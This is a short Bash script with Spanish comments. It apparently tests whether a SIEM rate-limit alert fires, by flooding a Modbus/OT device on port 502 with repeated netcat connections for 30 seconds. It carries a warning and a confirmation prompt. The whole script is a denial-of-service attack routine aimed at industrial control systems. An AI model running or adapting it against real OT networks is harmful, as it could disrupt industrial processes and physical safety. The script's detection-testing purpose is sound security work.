#!/bin/bash
# Simulación de DoS contra red OT (flood de requests Modbus)
# ADVERTENCIA: Solo ejecutar en red de pruebas aislada

TARGET_IP="${1:-192.168.50.10}"
MODBUS_PORT="502"
DURATION="30"  # segundos

echo "[WARNING] Esta simulación puede interrumpir servicios OT"
echo "[+] Target: $TARGET_IP:$MODBUS_PORT"
echo "[+] Duración: $DURATION segundos"
read -p "¿Continuar? (yes/no): " confirm

if [ "$confirm" != "yes" ]; then
    echo "[!] Simulación cancelada"
    exit 0
fi

echo "[+] Iniciando flood de requests Modbus..."
timeout $DURATION bash -c "while true; do nc -zv $TARGET_IP $MODBUS_PORT 2>&1 | head -1; done" 2>/dev/null || echo "    [*] Ejecutando flood..."

echo "[✓] Simulación completa"
echo "[!] Verificar alerta RATE-001 (Rate Limit Exceeded) en SIEM"
